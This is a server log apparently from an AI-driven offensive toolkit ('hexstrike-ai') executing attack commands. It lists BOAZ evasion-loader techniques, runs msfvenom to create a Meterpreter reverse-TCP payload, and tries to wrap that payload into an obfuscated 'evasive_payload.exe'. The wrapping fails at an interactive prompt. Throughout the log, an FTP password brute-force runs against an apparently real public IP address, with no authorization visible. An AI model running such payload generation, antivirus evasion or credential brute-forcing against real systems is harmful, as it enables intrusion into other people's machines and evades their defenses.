2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 48. Stealth new loader + Syscall breakpoints handler with memory guard AKA Sifu breakpoint handler (hook on NtResumeThread)
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 49. Stealth new loader + Syscall breakpoints handler with memory guard evasion AKA Sifu breakpoint handler (hook on NtCreateThreadEx, with Decoy address, PAGE_NOACCESS and XOR)
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 50. Woodpecker process injection, tactics similar to Kenshin-ko.  Focused on classification evasion.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 51. Stealth new loader + Syscall breakpoints handler with memory guard evasion AKA Sifu breakpoint handler (hook on ntdll!RtlUserThreadStart and kernel32!BaseThreadInitThunk, with Decoy address, PAGE_NOACCESS and XOR)
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 52. RoP gadgets as the trampoline code to execute the magic code.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 53.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 54. Stealth new loader + Exception handler + Syscall breakpoints handler with memory guard evasion AKA Sifu breakpoint handler (hook on ntdll!RtlUserThreadStart and kernel32!BaseThreadInitThunk, with Decoy address, PAGE_NOACCESS and XOR)
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 56. This is a fork of Loader 37 with additional features. If -ldr flag is not provided, loader will add module (contains the shellcode) to the PEB module lists manually using code from Dark library.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 57. A fork of loader 51 with XOR replaced with RC4 encryption offered by SystemFunction032/033.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 58. VEH add hanlder. Add ROP Trampoliine to the kernel32!BaseThreadInitThunk for additional complexity to analyse.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 59. SEH add hanlder. Add ROP Trampoliine to the kernel32!BaseThreadInitThunk for additional complexity to analyse.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 60. Use Page guard to trigger first exception to set debug registers without using NtGetContextThread --> NtSetContextThread
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 61. Use Page guard to trigger first exception to set debug registers without using NtGetContextThread --> NtSetContextThread + Use VEH to set up breakpoints Dr0~Dr3, Dr7. Then use VCH to execute the code. So, no registers and stack pointer and instruction pointer changed in VEH.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 62. New loader in progress.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 63. Remote version of custom module loading loader 37. Remote module injection.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 64.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 65. Advanced VMT hooking with custom module loader 37.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 66. A fork of L-65, with additional features such as optional PPID spoofing, multiple shellcode and DLL injection mitigation policies enabled on remote process.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 67. A fork of L-65, with strange trampoline code to execute the magic code in both local and remote process.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 68. New loader in progress.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 69. A fork of L-61, manually set VEH and VCH and clean ups by remove the CrossProcessFlags from TEB->PEB.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: ...
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 73. VT Pointer threadless process injection, can be invoked with decoy address to any function or triggered by injected application (e.g. explorer). Memory guard available with RC4 encryption and PAGE_NOACCESS.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 74. VT Pointer threadless process injection, can be invoked with decoy address to any function or triggered by injected application (e.g. explorer). Memory guard available with RC4 encryption and PAGE_NOACCESS. The VirtualProtect is being called within pretext.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 75. Dotnet JIT threadless process injection.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 76. Module List PEB Entrypoint threadless process injection.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 77. VT Pointer threadless process injection. Use RtlCreateHeap instead of BaseThreadInitThunk virtual table pointer.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 79. Proxy function call stub 2 step process injection: Kagemusha PI. Only CreateThread is called without explicitly call to Write primitive.
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:34,697 - __main__ - INFO - 🧹 CLEANUP: Process 44797 removed from registry
2025-10-24 01:42:34,697 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.58s
2025-10-24 01:42:34,697 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:42:34,697 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:42:34,697 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:42:34,697 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py -h
2025-10-24 01:42:34,697 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.58s
2025-10-24 01:42:34,697 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 12022 bytes
2025-10-24 01:42:34,697 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:42:34,697 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:42:34,697 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:42:34,697 - __main__ - INFO - 💾 Cached result for command: cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py -h
2025-10-24 01:42:34,698 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:42:34] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:42:35,028 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m21.6%[0m ETA: 235.1s Speed: 1 B/s | 64.9s | PID: 44673
2025-10-24 01:42:35,829 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m21.9%[0m ETA: 234.3s Speed: 1 B/s | 65.7s | PID: 44673
2025-10-24 01:42:36,431 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Autumn2013 (Incorrect: )
2025-10-24 01:42:36,630 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m22.2%[0m ETA: 233.5s Speed: 1 B/s | 66.5s | PID: 44673
2025-10-24 01:42:37,433 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m22.4%[0m ETA: 232.7s Speed: 1 B/s | 67.3s | PID: 44673
2025-10-24 01:42:38,235 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m22.7%[0m ETA: 231.9s Speed: 1 B/s | 68.1s | PID: 44673
2025-10-24 01:42:39,037 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m23.0%[0m ETA: 231.1s Speed: 1 B/s | 68.9s | PID: 44673
2025-10-24 01:42:39,841 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m23.2%[0m ETA: 230.3s Speed: 1 B/s | 69.7s | PID: 44673
2025-10-24 01:42:40,192 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:autumn2017 (Incorrect: )
2025-10-24 01:42:40,641 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m23.5%[0m ETA: 229.5s Speed: 1 B/s | 70.5s | PID: 44673
2025-10-24 01:42:41,442 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m23.8%[0m ETA: 228.7s Speed: 1 B/s | 71.3s | PID: 44673
2025-10-24 01:42:42,248 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m24.0%[0m ETA: 227.9s Speed: 1 B/s | 72.1s | PID: 44673
2025-10-24 01:42:43,052 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m24.3%[0m ETA: 227.1s Speed: 1 B/s | 72.9s | PID: 44673
2025-10-24 01:42:43,156 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:autumn2016 (Incorrect: )
2025-10-24 01:42:43,336 - __main__ - INFO - 🔍 Cache MISS for command: cd /opt/hexstrike-ai/BOAZ_beta && msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o payload.bin
2025-10-24 01:42:43,336 - __main__ - INFO - 🚀 EXECUTING: cd /opt/hexstrike-ai/BOAZ_beta && msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o payload.bin
2025-10-24 01:42:43,336 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:42:43,337 - __main__ - INFO - 🆔 PROCESS: PID 44831 started
2025-10-24 01:42:43,337 - __main__ - INFO - 🆔 REGISTERED: Process 44831 - cd /opt/hexstrike-ai/BOAZ_beta && msfvenom -p wind...
2025-10-24 01:42:43,338 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 44831
2025-10-24 01:42:43,853 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m24.6%[0m ETA: 226.3s Speed: 1 B/s | 73.7s | PID: 44673
2025-10-24 01:42:44,138 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.3%[0m Speed: 0 B/s | 0.8s | PID: 44831
2025-10-24 01:42:44,655 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m24.8%[0m ETA: 225.5s Speed: 1 B/s | 74.5s | PID: 44673
2025-10-24 01:42:44,941 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.5%[0m Speed: 0 B/s | 1.6s | PID: 44831
2025-10-24 01:42:45,455 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m25.1%[0m ETA: 224.7s Speed: 1 B/s | 75.3s | PID: 44673
2025-10-24 01:42:45,742 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.8%[0m Speed: 0 B/s | 2.4s | PID: 44831
2025-10-24 01:42:46,266 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m25.4%[0m ETA: 223.9s Speed: 1 B/s | 76.1s | PID: 44673
2025-10-24 01:42:46,425 - __main__ - WARNING - 📥 STDERR: [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
2025-10-24 01:42:46,425 - __main__ - WARNING - 📥 STDERR: [-] No arch selected, selecting arch: x64 from the payload
2025-10-24 01:42:46,542 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m1.1%[0m Speed: 46 B/s | 3.2s | PID: 44831
2025-10-24 01:42:46,627 - __main__ - WARNING - 📥 STDERR: No encoder specified, outputting raw payload
2025-10-24 01:42:46,627 - __main__ - WARNING - 📥 STDERR: Payload size: 510 bytes
2025-10-24 01:42:46,627 - __main__ - WARNING - 📥 STDERR: Saved as: payload.bin
2025-10-24 01:42:46,648 - __main__ - INFO - 🧹 CLEANUP: Process 44831 removed from registry
2025-10-24 01:42:46,648 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 3.31s
2025-10-24 01:42:46,648 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:42:46,648 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:42:46,648 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:42:46,648 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m cd /opt/hexstrike-ai/BOAZ_beta && msfvenom -p windows/x...
2025-10-24 01:42:46,648 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 3.31s
2025-10-24 01:42:46,648 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 237 bytes
2025-10-24 01:42:46,648 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:42:46,648 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:42:46,648 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:42:46,648 - __main__ - INFO - 💾 Cached result for command: cd /opt/hexstrike-ai/BOAZ_beta && msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o payload.bin
2025-10-24 01:42:46,649 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:42:46] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:42:47,068 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m25.6%[0m ETA: 223.1s Speed: 1 B/s | 76.9s | PID: 44673
2025-10-24 01:42:47,219 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:autumn2015 (Incorrect: )
2025-10-24 01:42:47,869 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m25.9%[0m ETA: 222.3s Speed: 1 B/s | 77.7s | PID: 44673
2025-10-24 01:42:48,670 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m26.2%[0m ETA: 221.5s Speed: 1 B/s | 78.5s | PID: 44673
2025-10-24 01:42:49,471 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m26.4%[0m ETA: 220.7s Speed: 1 B/s | 79.3s | PID: 44673
2025-10-24 01:42:50,272 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m26.7%[0m ETA: 219.9s Speed: 1 B/s | 80.1s | PID: 44673
2025-10-24 01:42:50,819 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:autumn2014 (Incorrect: )
2025-10-24 01:42:51,073 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m27.0%[0m ETA: 219.1s Speed: 1 B/s | 80.9s | PID: 44673
2025-10-24 01:42:51,873 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m27.2%[0m ETA: 218.3s Speed: 1 B/s | 81.7s | PID: 44673
2025-10-24 01:42:52,677 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m27.5%[0m ETA: 217.5s Speed: 1 B/s | 82.5s | PID: 44673
2025-10-24 01:42:52,873 - __main__ - INFO - 🔍 Cache MISS for command: cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py -f payload.bin -o evasive_payload.exe -l 28 -e aes -c pluto -obf -w 1 -entropy 2
2025-10-24 01:42:52,873 - __main__ - INFO - 🚀 EXECUTING: cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py -f payload.bin -o evasive_payload.exe -l 28 -e aes -c pluto -obf -w 1 -entropy 2
2025-10-24 01:42:52,873 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:42:52,873 - __main__ - INFO - 🆔 PROCESS: PID 44859 started
2025-10-24 01:42:52,874 - __main__ - INFO - 🆔 REGISTERED: Process 44859 - cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py ...
2025-10-24 01:42:52,875 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 44859
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: [0;36m
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: ╭━━╮╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━━╮╱╱╱╱╭╮
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: ┃╭╮┃╱╱╱╱╱╱╱╱╱╱╱┃╭━━╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭╮╭╮┃╱╱╱╱┃┃
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: ┃╰╯╰┳━━┳━━┳━━━╮┃╰━━┳╮╭┳━━┳━━┳┳━━┳━╮╱╰╯┃┃┣┻━┳━━┫┃
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: ┃╭━╮┃╭╮┃╭╮┣━━┃┃┃╭━━┫╰╯┃╭╮┃━━╋┫╭╮┃╭╮╮╱╱┃┃┃╭╮┃╭╮┃┃
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: ┃╰━╯┃╰╯┃╭╮┃┃━━┫┃╰━━╋╮╭┫╭╮┣━━┃┃╰╯┃┃┃┃╱╱┃┃┃╰╯┃╰╯┃╰╮
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: ╰━━━┻━━┻╯╰┻━━━╯╰━━━╯╰╯╰╯╰┻━━┻┻━━┻╯╰╯╱╱╰╯╰━━┻━━┻━╯
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: .@@@@@@&%#%
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: .@@@@@@@%#(
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: #@@@@@@@&#((
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: @@@@@@@@@&&%%%
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: %#%%@@@@%(/*,                               ..
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: %**,,,,*****.                          #%##((////(.
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: .//***//*/                          ,%%%##(((((((#(
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: .%&%%/,,,**(#%&,                       */(##########%.
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: &@@@&&%(//   *%&@#                      ********/%%%%%
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: &@@@&%%&%(/   *%&@&,.                     *//////#&&&&#
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: .@@@&&%##&%#(/ /&&&&*.                  .*  ***/(#&&&#
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: @@@@&&%%%%&&%%%&&*               ((  .(    /***.   .,,*
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: *%&&&&&%#/,                    .//,(((/(%#/(.**,.*,,,*,
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: /**,,/(((#&&&%, *%*******.
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: ,//*/%(((%&(// ....,/**//.
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: (*((((/////////////.
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: .,*//**,
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:53,409 - __main__ - INFO - 📤 STDOUT: [0m
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: [0;35mBoaz mini-evasion framework is starting...
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: [0m
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'input_file'[0m is selected with argument:[91m payload.bin [0m
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'output_file'[0m is selected with argument:[91m evasive_payload.exe [0m
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'loader'[0m is selected with argument:[91m 28 [0m
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'shellcode_type'[0m is selected with argument:[91m donut [0m
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'encoding'[0m is selected with argument:[91m aes [0m
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'compiler'[0m is selected with argument:[91m pluto [0m
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'obfuscate'[0m is selected with argument:[91m True [0m
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'syswhisper'[0m is selected with argument:[91m 1 [0m
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'entropy'[0m is selected with argument:[91m 2 [0m
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: [+] Option [95m'watermark'[0m is selected with argument:[91m 1 [0m
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: The input file ends with .bin
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: Choose your Position Independent Code converter:
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: 1) donut
2025-10-24 01:42:53,410 - __main__ - INFO - 📤 STDOUT: 2) stardust
2025-10-24 01:42:53,413 - __main__ - WARNING - 📥 STDERR: Traceback (most recent call last):
2025-10-24 01:42:53,417 - __main__ - WARNING - 📥 STDERR: File "/opt/hexstrike-ai/BOAZ_beta/Boaz.py", line 1717, in <module>
2025-10-24 01:42:53,417 - __main__ - WARNING - 📥 STDERR: main()
2025-10-24 01:42:53,417 - __main__ - WARNING - 📥 STDERR: ~~~~^^
2025-10-24 01:42:53,417 - __main__ - WARNING - 📥 STDERR: File "/opt/hexstrike-ai/BOAZ_beta/Boaz.py", line 1493, in main
2025-10-24 01:42:53,417 - __main__ - WARNING - 📥 STDERR: choice = input("Choose your Position Independent Code converter:\n1) donut\n2) stardust\nEnter your choice (1 or 2): ")
2025-10-24 01:42:53,417 - __main__ - WARNING - 📥 STDERR: EOFError: EOF when reading a line
2025-10-24 01:42:53,425 - __main__ - INFO - 📤 STDOUT: Enter your choice (1 or 2):
2025-10-24 01:42:53,438 - __main__ - INFO - 🧹 CLEANUP: Process 44859 removed from registry
2025-10-24 01:42:53,438 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.57s
2025-10-24 01:42:53,438 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:42:53,438 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:42:53,438 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:42:53,438 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py -f pa...
2025-10-24 01:42:53,438 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.57s
2025-10-24 01:42:53,438 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 2892 bytes
2025-10-24 01:42:53,438 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:42:53,438 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:42:53,438 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:42:53,439 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:42:53] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:42:53,487 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m27.8%[0m ETA: 216.6s Speed: 1 B/s | 83.4s | PID: 44673
2025-10-24 01:42:53,823 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:autumn2013 (Incorrect: )
2025-10-24 01:42:54,291 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m28.1%[0m ETA: 215.8s Speed: 1 B/s | 84.2s | PID: 44673
2025-10-24 01:42:55,091 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m28.3%[0m ETA: 215.0s Speed: 1 B/s | 85.0s | PID: 44673
2025-10-24 01:42:55,892 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m28.6%[0m ETA: 214.2s Speed: 1 B/s | 85.8s | PID: 44673
2025-10-24 01:42:56,694 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m28.9%[0m ETA: 213.4s Speed: 1 B/s | 86.6s | PID: 44673
2025-10-24 01:42:57,497 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m29.1%[0m ETA: 212.6s Speed: 1 B/s | 87.4s | PID: 44673
2025-10-24 01:42:57,946 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Winter2017 (Incorrect: )
2025-10-24 01:42:58,301 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m29.4%[0m ETA: 211.8s Speed: 1 B/s | 88.2s | PID: 44673
2025-10-24 01:42:59,102 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m29.7%[0m ETA: 211.0s Speed: 1 B/s | 89.0s | PID: 44673
